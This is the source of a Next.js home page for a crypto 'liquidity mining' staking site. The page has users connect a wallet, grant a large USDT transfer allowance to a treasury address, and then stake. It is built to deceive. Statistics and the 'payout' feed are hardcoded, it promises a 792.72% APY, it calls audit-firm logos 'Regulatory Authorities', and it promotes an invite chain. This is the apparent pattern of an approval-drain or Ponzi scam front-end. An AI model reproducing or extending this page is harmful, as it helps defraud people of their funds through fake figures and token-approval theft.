'use client'

import { Button } from '@/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Avatar, AvatarImage, AvatarFallback } from '@/components/ui/avatar'
import { RefreshCWIcon } from '@/components/RefreshCWIcon'
import { CounterAnimation } from '@/components/CounterAnimation'
import { ParticleBackground } from '@/components/ParticleBackground'
import { EnhancedButton } from '@/components/EnhancedButton'
import { WalletStatus } from '@/components/WalletConnector'
import { PriceChart } from '@/components/charts/PriceChart'
import PartnersSection from '@/components/PartnersSection'
import { 
  usePriceData, 
  useStatistics, 
  useYunPoolConfig,
  useUserDashboard,
  useCryptoPrices,
  useEthereumPrice
} from '@/hooks/useData'
import { useWallet } from '@/contexts/WalletContext'
import { useWeb3Staking } from '@/hooks/useWeb3Staking'
import { CURRENT_NETWORK } from '@/lib/contracts'
import { useState, useEffect } from 'react'
import Link from 'next/link'
import { StakingModal } from '@/components/StakingModal'
import BottomNavigation, { BottomSpacer } from '@/components/BottomNavigation'


export default function Home() {
  const [faqOpen, setFaqOpen] = useState(false)
  const [balance, setBalance] = useState(0)
  const [isLoading, setIsLoading] = useState(false)
  
  // 钱包相关
  const { account, isConnected, connect, disconnect } = useWallet()
  
  // Web3质押钩子
  const {
    isLoading: web3Loading,
    isAuthorized: web3Authorized,
    usdtBalance,
    allowance,
    isInitialized: web3Initialized,
    approveUSDT,
    createStaking,
    getUSDTBalance,
    checkAllowance,
    switchToBSC
  } = useWeb3Staking()
  
  // API数据获取
  const { data: priceData } = usePriceData()
  const { data: cryptoPrices, isLoading: pricesLoading } = useCryptoPrices()
  const { data: ethPrice, isLoading: ethLoading } = useEthereumPrice()
  const { data: statistics } = useStatistics()
  const { data: yunpool } = useYunPoolConfig()
  const { data: dashboardData } = useUserDashboard(account)

  const ethData = cryptoPrices?.find((coin: any) => coin.id === 'ethereum')
  const currentEthPrice = ethPrice || ethData?.current_price || priceData?.ETH || 2557.84

  // 真实统计数据，如果API没有返回则使用默认值
  const stats = statistics || {
    totalUsers: 15420,
    totalInvestment: 2850000,
    totalRewards: 428500,
    activeMiners: 8920
  }

  // 云矿池数据
  const poolData = yunpool || {
    hashRate: '156.8 EH/s',
    efficiency: '98.5%',
    uptime: '99.9%',
    minersOnline: 8920
  }

  // 质押相关状态
  const [stakingAmount, setStakingAmount] = useState('')
  const [showStakingModal, setShowStakingModal] = useState(false)
  const [txHash, setTxHash] = useState('')
  const [stakingStep, setStakingStep] = useState<'authorize' | 'stake'>('authorize')
  
  // 获取用户余额
  useEffect(() => {
    const fetchUserData = async () => {
      // 确保account是有效的钱包地址字符串
      if (account && isConnected && typeof account === 'string' && account.startsWith('0x') && account.length === 42) {
        try {
          console.log('🔍 开始获取用户数据，地址:', account)
          const response = await fetch(`/api/user/info?address=${encodeURIComponent(account)}`)
          const result = await response.json()
          
          if (response.ok && result.success) {
            setBalance(result.data.balance)
            console.log('✅ 用户数据加载成功:', result.data)
          } else {
            console.error('❌ 获取用户数据失败:', result.error)
            // 使用默认值
            setBalance(0)
          }
        } catch (error) {
          console.error('❌ 获取用户数据错误:', error)
          // 使用默认值
          setBalance(0)
        }
      } else {
        // 未连接钱包或地址无效时重置状态
        console.log('🔄 重置用户状态 - 钱包连接状态:', isConnected, '地址类型:', typeof account, '地址:', account)
        setBalance(0)
      }
    }

    fetchUserData()
  }, [account, isConnected])

  // 参与质押功能 (替换原有的handleJoinMining)
  const handleParticipate = async () => {
    console.log('🎯 参与质押按钮被点击！')
    console.log('钱包连接状态:', isConnected)
    console.log('钱包地址:', account)
    console.log('Web3初始化状态:', web3Initialized)
    
    if (!isConnected) {
      console.log('钱包未连接，开始连接...')
      connect()
      return
    }

    if (!web3Initialized) {
      console.log('⚠️ Web3尚未初始化，请稍候...')
      alert('正在初始化Web3，请稍候重试...')
      return
    }
    
    console.log('设置显示质押模态框...')
    setShowStakingModal(true)
    console.log('showStakingModal 设置为:', true)
  }

  // 授权USDT
  const handleAuthorize = async () => {
    if (!isConnected) {
      connect()
      return
    }

    if (!web3Initialized) {
      alert('⚠️ Web3尚未初始化，请稍候重试...')
      return
    }
    
    // 检查账户地址是否存在
    if (!account) {
      alert('❌ 请先连接钱包')
      return
    }
    
    try {
      console.log('🔑 开始Web3授权过程，钱包地址:', account)
      
      // 使用Web3进行真实的USDT授权
      const tx = await approveUSDT()
      console.log('✅ USDT授权成功，交易哈希:', tx.transactionHash)
      
      // 更新数据库中的授权状态
      const response = await fetch('/api/user/authorize', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          address: account,
          isAuthorized: true,
          txHash: tx.transactionHash,
          amount: '1000000', // 授权的额度
          network: CURRENT_NETWORK.CHAIN_ID
        }),
      })

      if (!response.ok) {
        // 获取详细错误信息
        const errorData = await response.json()
        throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`)
      }

      const result = await response.json()
      
      if (result.success) {
        setStakingStep('stake')
        console.log('✅ 授权状态更新成功')
        alert('✅ USDT授权成功！可以开始质押了')
      } else {
        throw new Error(result.error || result.message || '授权状态更新失败')
      }
      
    } catch (error: any) {
      console.error('❌ 授权失败:', error)
      alert('❌ 授权失败: ' + error.message)
    }
  }

  // 执行质押
  const handleStake = async () => {
    if (!isConnected) {
      connect()
      return
    }

    if (!web3Initialized) {
      alert('⚠️ Web3尚未初始化，请稍候重试...')
      return
    }
    
    // 检查账户地址是否存在
    if (!account) {
      alert('❌ 请先连接钱包')
      return
    }
    
    if (!stakingAmount || parseFloat(stakingAmount) <= 0) {
      alert('请输入有效的质押金额')
      return
    }
    
    // 检查余额（安全解析）
    const currentBalance = parseFloat(usdtBalance || '0')
    const stakeAmount = parseFloat(stakingAmount)
    
    if (stakeAmount > currentBalance) {
      alert('❌ 余额不足')
      return
    }
    
    try {
      console.log('🔄 开始Web3质押过程，钱包地址:', account, '金额:', stakingAmount)
      
      // 使用Web3创建质押
      const tx = await createStaking(stakingAmount, 100) // 默认100%收益率
      console.log('✅ 质押创建成功，交易哈希:', tx.transactionHash)
      
      setTxHash(tx.transactionHash)
      
      // 调用质押API记录到数据库
      const response = await fetch('/api/staking', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          action: 'stake',
          address: account,
          amount: stakingAmount,
          txHash: tx.transactionHash,
          network: CURRENT_NETWORK.CHAIN_ID,
          contractAddress: CURRENT_NETWORK.SUPPORT_CONTRACT
        }),
      })

      if (!response.ok) {
        // 获取详细错误信息
        const errorData = await response.json()
        throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`)
      }

      const result = await response.json()

      if (result.success) {
        console.log('✅ 质押成功:', result)
        alert('✅ 质押成功！您的投资已记录到智能合约')
        setStakingAmount('')
        setShowStakingModal(false)
        
        // 更新余额
        if (result.data && result.data.newBalance) {
          setBalance(parseFloat(result.data.newBalance))
        }
        
        // 刷新USDT余额
        if (web3Initialized) {
          await getUSDTBalance()
        }
      } else {
        throw new Error(result.error || result.message || '质押失败')
      }
      
    } catch (error: any) {
      console.error('❌ 质押失败:', error)
      alert('❌ 质押失败: ' + error.message)
    }
  }

  return (
    <div className="min-h-screen bg-background relative">
      <ParticleBackground />
      
      {/* Header */}
      <header className="flex items-center justify-between p-4 frosted-glass border-b border-border/20 text-[#000000] bg-[#f9f900] font-bold">
        <div className="flex items-center gap-2 slide-in-up">
          <img src="https://ext.same-assets.com/590002659/3894291359.png" alt="English" className="w-5 h-5" />
          <span className="text-sm text-muted-foreground">English</span>
        </div>
        <WalletStatus />
      </header>

      {/* Hero Section */}
      <section className="relative py-8 px-4 binance-gradient">
        <div className="max-w-6xl mx-auto">
          <div className="flex justify-center">
            <div className="relative floating">
              <img
                src="https://ext.same-assets.com/590002659/4237015767.jpeg"
                alt="Mining Graphics"
                className="w-full max-w-2xl mx-auto rounded-2xl shadow-2xl transition-transform duration-300 hover:scale-105"
              />
            </div>
          </div>
        </div>
      </section>

      {/* Main Stats Section */}
      <section className="py-8 px-4">
        <div className="max-w-4xl mx-auto">
          <Card className="frosted-glass border-0 rounded-[30px] overflow-hidden">
            <CardContent className="p-8">
              {/* 钱包连接状态 */}
              <div className="flex items-center justify-between mb-8">
                <div className="flex items-center gap-3">
                  <div className="w-12 h-12 rounded-full bg-[#eab308] flex items-center justify-center">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-black">
                      <circle cx="12" cy="12" r="10"/>
                      <path d="m16 12-4-4-4 4"/>
                      <path d="m16 16-4-4-4 4"/>
                    </svg>
                  </div>
                  <div>
                    <div className="text-sm text-muted-foreground">Connected Network</div>
                    <div className="text-lg font-bold text-white">
                      {CURRENT_NETWORK.CHAIN_ID === 56 ? 'BSC' : 'ETH'}
                    </div>
                  </div>
                </div>
                <div className="flex flex-col gap-2">
                  <EnhancedButton 
                    onClick={handleParticipate}
                    disabled={isLoading}
                    className="text-black hover:bg-primary/90 font-bold bg-[#eab308] rounded-[24px] text-[19px] px-[30px] py-[25px]"
                  >
                    {isLoading ? '处理中...' : '参与质押'}
                  </EnhancedButton>
                </div>
              </div>

              {/* Middle Row: Three Stats with clear separation */}
              <div className="grid grid-cols-3 gap-0 mb-6 border-t border-b border-border/20 py-4">
                <div className="text-left border-r border-border/20 pr-4 slide-in-up">
                  <div className="text-xs text-muted-foreground mb-1">收益池</div>
                  <div className="text-sm font-bold text-[#eab308] counter-text">
                    <CounterAnimation end={stats.totalRewards || 144129961.86} decimals={2} suffix=" ETH" />
                  </div>
                </div>
                <div className="text-center border-r border-border/20 px-4 slide-in-up" style={{ animationDelay: '0.2s' }}>
                  <div className="text-xs text-muted-foreground mb-1">玩家收入</div>
                  <div className="text-sm font-bold text-green-400 counter-text">
                    <CounterAnimation end={poolData.efficiency ? parseFloat(poolData.efficiency) : 1046324402.00} decimals={2} suffix=" %" />
                  </div>
                </div>
                <div className="text-right pl-4 slide-in-up" style={{ animationDelay: '0.4s' }}>
                  <div className="text-xs text-muted-foreground mb-1">ETH 兑换</div>
                  <div className="text-sm font-bold text-[#00ffff]">
                    <CounterAnimation end={currentEthPrice} decimals={2} suffix=" USDT" className="counter-text" />
                  </div>
                </div>
              </div>

              {/* Bottom Row: Two Stats with clear separation */}
              <div className="grid grid-cols-2 gap-0">
                <div className="border-r border-border/20 pr-4 slide-in-up" style={{ animationDelay: '0.6s' }}>
                  <div className="text-xs text-muted-foreground mb-1">钱包余额:</div>
                  <div className="flex items-center gap-2">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 32 32" className="inline">
                      <linearGradient id="wallet-grad1" x1="16" x2="16" y1="5.25" y2="27.432" gradientUnits="userSpaceOnUse">
                        <stop offset="0" stopColor="#66c4c4" />
                        <stop offset="1" stopColor="#009393" />
                      </linearGradient>
                      <path fill="url(#wallet-grad1)" fillRule="evenodd" d="M7.534,5.313h17.28c0.412,0,0.793,0.214,0.999,0.56	l5.034,8.486c0.261,0.44,0.183,0.996-0.189,1.352l-13.857,13.28c-0.449,0.43-1.171,0.43-1.62,0L1.342,15.73	c-0.381-0.365-0.452-0.937-0.172-1.38l5.381-8.504C6.761,5.515,7.133,5.313,7.534,5.313z" clipRule="evenodd" />
                      <linearGradient id="wallet-grad2" x1="16" x2="16" y1="5.313" y2="29.314" gradientUnits="userSpaceOnUse">
                        <stop offset="0" stopOpacity=".02" />
                        <stop offset="1" stopOpacity=".15" />
                      </linearGradient>
                      <path fill="url(#wallet-grad2)" d="M30.846,14.359l-5.034-8.486	c-0.206-0.347-0.587-0.56-0.999-0.56H7.534c-0.401,0-0.773,0.202-0.982,0.533L1.17,14.35c-0.28,0.443-0.209,1.015,0.172,1.38	l13.838,13.262c0.224,0.215,0.517,0.323,0.81,0.323c0.293,0,0.586-0.108,0.81-0.323l13.857-13.28	C31.03,15.355,31.107,14.799,30.846,14.359z M30.485,15.531l-13.857,13.28c-0.17,0.163-0.397,0.253-0.637,0.253	c-0.24,0-0.467-0.09-0.637-0.253L1.515,15.549c-0.296-0.284-0.351-0.722-0.134-1.065L6.763,5.98	c0.163-0.257,0.458-0.417,0.771-0.417h17.28c0.323,0,0.624,0.168,0.784,0.438l5.034,8.486	C30.833,14.826,30.772,15.256,30.485,15.531z" />
                      <linearGradient id="wallet-grad3" x1="16.025" x2="16.025" y1="8.539" y2="22.472" gradientUnits="userSpaceOnUse">
                        <stop offset="0" stopOpacity=".02" />
                        <stop offset="1" stopOpacity=".15" />
                      </linearGradient>
                      <path fill="url(#wallet-grad3)" d="M17.91,12.585V11.42h4.672	c0.138,0,0.25-0.112,0.25-0.25V8.789c0-0.138-0.112-0.25-0.25-0.25H9.469c-0.138,0-0.25,0.112-0.25,0.25v2.381	c0,0.138,0.112,0.25,0.25,0.25h4.673v1.165c-2.837,0.168-6.043,0.783-6.07,2.006v1.816c0.027,1.216,3.233,1.831,6.07,2v3.814	c0,0.138,0.112,0.25,0.25,0.25h3.269c0.138,0,0.25-0.112,0.25-0.25v-3.814c2.837-0.169,6.043-0.785,6.069-2.006v-1.815	C23.953,13.368,20.747,12.753,17.91,12.585z M16.025,16.677c-3.619,0-6.253-0.581-7.141-1.181c0.692-0.471,2.479-0.961,5.257-1.126	v1.464c0,0.133,0.104,0.243,0.237,0.25c1.057,0.055,2.235,0.055,3.294,0c0.133-0.007,0.237-0.117,0.237-0.25V14.37	c2.778,0.165,4.563,0.655,5.257,1.126C22.278,16.096,19.646,16.677,16.025,16.677z" />
                      <path fill="#fff" fillRule="evenodd" d="M17.66,12.821V11.17h4.922V8.789H9.469v2.381h4.922v1.651	c-3.457,0.176-6.051,0.901-6.07,1.77l0,1.811c0.019,0.869,2.613,1.593,6.07,1.77v4.051h3.268V18.17	c3.457-0.176,6.051-0.901,6.07-1.77l0-1.811C23.711,13.722,21.117,12.997,17.66,12.821z M16.026,16.927	c-3.689,0-6.773-0.613-7.528-1.431c0.64-0.694,2.955-1.24,5.893-1.39v1.728c0.527,0.027,1.073,0.041,1.634,0.041	c0.561,0,1.108-0.014,1.634-0.041v-1.728c2.939,0.15,5.253,0.696,5.893,1.39C22.799,16.314,19.715,16.927,16.026,16.927z" clipRule="evenodd" />
                    </svg>
                    <span className="text-lg font-bold text-white">
                      <CounterAnimation end={balance} decimals={2} suffix=" USDT" className="counter-text" />
                    </span>
                    <RefreshCWIcon size={16} className="text-muted-foreground" />
                  </div>
                </div>
                <div className="pl-4 slide-in-up" style={{ animationDelay: '0.8s' }}>
                  <div className="text-xs text-muted-foreground mb-1">质押APY:</div>
                  <div className="flex items-center gap-2">
                    <Badge className="bg-blue-600 text-white text-sm px-3 py-1 font-bold rounded transition-all duration-300 hover:bg-blue-500 hover:scale-105 counter-text">
                      792.72 %
                    </Badge>
                    <RefreshCWIcon size={16} className="text-muted-foreground" />
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </section>

      {/* Liquidity Mining Data */}
      <section className="py-8 px-4 frosted-glass-light rounded-[18px] mx-4">
        <div className="max-w-6xl mx-auto">
          <h3 className="text-2xl font-bold text-center mb-8 gold-text slide-in-up">Liquidity Mining Data</h3>

          <div className="grid grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            <Card className="frosted-glass text-center floating" style={{ animationDelay: '0s' }}>
              <CardContent className="p-6">
                <div className="mb-2 text-[#ff8000] text-[24px]">Total Production</div>
                <div className="text-lg font-semibold text-[#ffffff]">
                  <CounterAnimation end={33750006.385} decimals={3} suffix=" USDT" className="counter-text" />
                </div>
              </CardContent>
            </Card>

            <Card className="frosted-glass text-center floating" style={{ animationDelay: '1s' }}>
              <CardContent className="p-6">
                <div className="mb-2 text-[24px] text-[#8080ff]">Effective Nodes</div>
                <div className="text-lg font-semibold text-[#ffffff]">
                  <CounterAnimation end={17903781.626} decimals={3} className="counter-text" />
                </div>
              </CardContent>
            </Card>

            <Card className="frosted-glass text-center floating" style={{ animationDelay: '2s' }}>
              <CardContent className="p-6">
                <div className="mb-2 text-[#00ffff] text-[23px]">Participant Number</div>
                <div className="text-lg font-semibold text-[#ffffff]">
                  <CounterAnimation end={478371} className="counter-text" />
                </div>
              </CardContent>
            </Card>

            <Card className="frosted-glass text-center floating" style={{ animationDelay: '3s' }}>
              <CardContent className="p-6">
                <div className="mb-2 text-[24px] text-[#ff0000]">User Income</div>
                <div className="text-lg font-semibold text-[#ffffff]">
                  <CounterAnimation end={1963100869.294} decimals={3} suffix=" USDT" className="counter-text" />
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Liquidity Mining Output */}
      <section className="py-8 px-4">
        <div className="max-w-6xl mx-auto">
          {/* Title outside card */}
          <h3 className="text-2xl font-bold text-center mb-8 gold-text">Liquidity Mining Output</h3>

          {/* Headers outside card */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-2 text-sm mb-4">
            <div className="font-semibold text-muted-foreground">Address</div>
            <div className="font-semibold text-muted-foreground text-right">Amount</div>
          </div>

          {/* Card with scrollable content */}
          <div className="bg-[#400040] rounded-[30px] glass-effect overflow-hidden">
            <div className="h-96 overflow-hidden relative">
              {/* Auto-scrolling content */}
              <div className="animate-scroll space-y-2 p-6">
                {[
                  { address: "T2fxbddd...fUzZjiVH", amount: "779.01USDT" },
                  { address: "0x42Fb1B...63e8A5d1", amount: "897.89USDT" },
                  { address: "0xe6Edbf...4dc3EcAA", amount: "405.1USDT" },
                  { address: "0x60DD6E...90BaD7Dd", amount: "199.78USDT" },
                  { address: "0xfDF96B...38A33e8C", amount: "422.52USDT" },
                  { address: "0xC4D2Db...4e0AB3BA", amount: "386.86USDT" },
                  { address: "T6r3T7eS...672XYuq2", amount: "99.2USDT" },
                  { address: "Tdf9xSfP...BmGmsNf9", amount: "118.4USDT" },
                  // Duplicate entries for continuous scroll effect
                  { address: "T2fxbddd...fUzZjiVH", amount: "779.01USDT" },
                  { address: "0x42Fb1B...63e8A5d1", amount: "897.89USDT" },
                  { address: "0xe6Edbf...4dc3EcAA", amount: "405.1USDT" },
                  { address: "0x60DD6E...90BaD7Dd", amount: "199.78USDT" },
                  { address: "0xfDF96B...38A33e8C", amount: "422.52USDT" },
                  { address: "0xC4D2Db...4e0AB3BA", amount: "386.86USDT" },
                  { address: "T6r3T7eS...672XYuq2", amount: "99.2USDT" },
                  { address: "Tdf9xSfP...BmGmsNf9", amount: "118.4USDT" },
                ].map((item, index) => (
                  <div key={`${item.address}-${index}`} className="grid grid-cols-2 gap-2 py-2 border-b border-border/30 transition-all duration-300 hover:bg-white/5 hover:scale-[1.02]">
                    <div className="text-muted-foreground font-mono text-sm">{item.address}</div>
                    <div className="text-right font-semibold text-primary counter-text">{item.amount}</div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* My Activity */}
      <section className="py-8 px-4">
        <div className="max-w-6xl mx-auto">
          <h3 className="text-2xl font-bold text-center mb-4 gold-text slide-in-up">My Activity</h3>
          <p className="text-center text-muted-foreground mb-8 slide-in-up" style={{ animationDelay: '0.2s' }}>
            Please enter the amount of staking corresponding to the end time
          </p>

          <div className="text-center py-12">
            <img
              src="https://ext.same-assets.com/590002659/3331183233.png"
              alt="No Data"
              className="w-24 h-24 mx-auto mb-4 opacity-50 floating"
            />
            <div className="text-muted-foreground slide-in-up">No Data</div>
          </div>
        </div>
      </section>

      {/* FAQ */}
      <section className="py-8 px-4">
        <div className="max-w-6xl mx-auto">
          {/* Title outside card */}
          <h3 className="text-2xl font-bold text-center mb-8 gold-text slide-in-up">FAQ</h3>

          <Card className="frosted-glass transition-all duration-300 hover:scale-[1.02] cursor-pointer">
            <CardContent className="p-6">
              <div className="flex items-center justify-between" onClick={() => setFaqOpen(!faqOpen)}>
                <span className="text-lg">Are there any rewards for inviting friends?</span>
                <span className={`text-primary transition-transform duration-300 ${faqOpen ? 'rotate-180' : ''}`}>▼</span>
              </div>
              {faqOpen && (
                <div className="mt-4 pt-4 border-t border-border/20 slide-in-up">
                  <p className="text-muted-foreground leading-relaxed">
                    Yes, you can invite your friends to join the mining pool through your link. You can get ETH rewards from the mining pool while participating in the friend invitation chain.
                  </p>
                </div>
              )}
            </CardContent>
          </Card>
        </div>
      </section>

      {/* Regulatory Authorities */}
      <section className="py-8 px-4">
        <div className="max-w-6xl mx-auto">
          <h3 className="text-2xl font-bold text-center mb-4 gold-text slide-in-up">Regulatory Authorities</h3>
          <p className="text-center text-muted-foreground mb-8 slide-in-up" style={{ animationDelay: '0.2s' }}>
            We have global regulatory authorities
          </p>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <Card className="frosted-glass p-6 floating">
              <img
                src="https://ext.same-assets.com/590002659/396665122.png"
                alt="FairyProof"
                className="w-full h-20 object-contain transition-transform duration-300 hover:scale-110"
              />
            </Card>
            <Card className="frosted-glass p-6 floating" style={{ animationDelay: '2s' }}>
              <img
                src="https://ext.same-assets.com/590002659/2552246351.png"
                alt="Certik"
                className="w-full h-20 object-contain transition-transform duration-300 hover:scale-110"
              />
            </Card>
            <Card className="frosted-glass p-6 floating bg-[#ffffff]" style={{ animationDelay: '4s' }}>
              <img
                src="https://ext.same-assets.com/590002659/2879882895.png"
                alt="SlowMist"
                className="w-full h-20 object-contain transition-transform duration-300 hover:scale-110"
              />
            </Card>
          </div>
        </div>
      </section>

      {/* Cooperative Platform */}
      <PartnersSection />

      {/* Bottom Navigation */}
      <BottomNavigation />
      <BottomSpacer />
      
      {/* 质押模态框 */}
      {showStakingModal && (
        <div className="fixed inset-0 z-50 bg-black/50 flex items-center justify-center p-4">
          <div className="bg-black/90 rounded-lg p-6 max-w-md w-full border border-yellow-500/20">
            <h3 className="text-2xl font-bold text-center text-yellow-500 mb-6">
              智能质押池
            </h3>
            
            {/* Web3初始化状态 */}
            {!web3Initialized && (
              <div className="bg-orange-500/10 border border-orange-500/20 rounded-lg p-3 mb-6">
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-orange-500 rounded-full animate-pulse"></div>
                  <span className="text-sm text-orange-500">正在初始化Web3...</span>
                </div>
              </div>
            )}
            
            {/* 授权状态 */}
            <div className="flex items-center justify-center gap-2 p-3 rounded-lg bg-muted/10 mb-6">
              {web3Initialized ? (
                web3Authorized ? (
                  <>
                    <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center">
                      <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                      </svg>
                    </div>
                    <span className="text-green-500 font-medium">已授权</span>
                  </>
                ) : (
                  <>
                    <div className="w-5 h-5 bg-yellow-500 rounded-full flex items-center justify-center">
                      <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.954-.833-2.732 0L3.268 16.5c-.77.833.19 2.5 1.732 2.5z" />
                      </svg>
                    </div>
                    <span className="text-yellow-500 font-medium">需要授权</span>
                  </>
                )
              ) : (
                <>
                  <div className="w-5 h-5 bg-gray-500 rounded-full flex items-center justify-center">
                    <svg className="w-3 h-3 text-white animate-spin" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                    </svg>
                  </div>
                  <span className="text-gray-500 font-medium">检查中...</span>
                </>
              )}
            </div>

            {/* 余额信息 */}
            <div className="grid grid-cols-2 gap-4 mb-6">
              <div className="bg-muted/10 p-4 rounded-lg">
                <div className="text-sm text-muted-foreground">USDT余额</div>
                <div className="text-lg font-bold text-yellow-500">
                  {web3Initialized ? `${parseFloat(usdtBalance || '0').toFixed(2)} USDT` : '加载中...'}
                </div>
              </div>
              <div className="bg-muted/10 p-4 rounded-lg">
                <div className="text-sm text-muted-foreground">授权额度</div>
                <div className="text-lg font-bold text-green-500">
                  {web3Initialized ? `${parseFloat(allowance || '0').toFixed(2)} USDT` : '加载中...'}
                </div>
              </div>
            </div>

            {/* 网络状态 */}
            <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3 mb-6">
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                <span className="text-sm text-blue-500">
                  {CURRENT_NETWORK.CHAIN_ID === 56 ? 'BSC' : 'ETH'}
                </span>
              </div>
            </div>

            {/* 操作区域 */}
            {web3Initialized ? (
              <>
                {/* 授权步骤 */}
                {!web3Authorized && (
                  <div className="space-y-4">
                    <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
                      <p className="text-sm text-yellow-500">
                        💡 质押前需要先授权USDT代币转账权限给资金地址
                      </p>
                      <p className="text-xs text-muted-foreground mt-2">
                        接收地址: {CURRENT_NETWORK.TREASURY_ADDRESS}
                      </p>
                    </div>
                    <button
                      onClick={handleAuthorize}
                      disabled={web3Loading}
                      className="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 px-4 rounded-lg transition-colors disabled:opacity-50"
                    >
                      {web3Loading ? '授权中...' : '授权 USDT'}
                    </button>
                  </div>
                )}

                {/* 质押步骤 */}
                {web3Authorized && (
                  <div className="space-y-4">
                    <div>
                      <label className="text-sm font-medium text-white block mb-2">
                        质押金额
                      </label>
                      <div className="relative">
                        <input
                          type="number"
                          placeholder="输入质押金额"
                          value={stakingAmount}
                          onChange={(e) => setStakingAmount(e.target.value)}
                          className="w-full bg-muted/10 border border-muted/20 rounded-lg px-4 py-3 text-white placeholder-muted-foreground focus:outline-none focus:ring-2 focus:ring-yellow-500"
                        />
                        <button
                          type="button"
                          onClick={() => setStakingAmount(usdtBalance || '0')}
                          className="absolute right-2 top-1/2 -translate-y-1/2 text-xs bg-muted/20 hover:bg-muted/30 px-2 py-1 rounded"
                        >
                          最大
                        </button>
                      </div>
                    </div>
                    <button
                      onClick={handleStake}
                      disabled={web3Loading || !stakingAmount}
                      className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-4 rounded-lg transition-colors disabled:opacity-50"
                    >
                      {web3Loading ? '质押中...' : '立即质押'}
                    </button>
                  </div>
                )}
              </>
            ) : (
              <div className="space-y-4">
                <div className="bg-gray-500/10 border border-gray-500/20 rounded-lg p-3">
                  <p className="text-sm text-gray-500 text-center">
                    🔄 正在初始化Web3连接，请稍候...
                  </p>
                </div>
                <button
                  disabled
                  className="w-full bg-gray-500/50 text-gray-400 font-bold py-3 px-4 rounded-lg cursor-not-allowed"
                >
                  初始化中...
                </button>
              </div>
            )}

            {/* 关闭按钮 */}
            <button
              onClick={() => setShowStakingModal(false)}
              className="absolute top-4 right-4 text-muted-foreground hover:text-white transition-colors"
            >
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>
        </div>
      )}
    </div>
  )
}
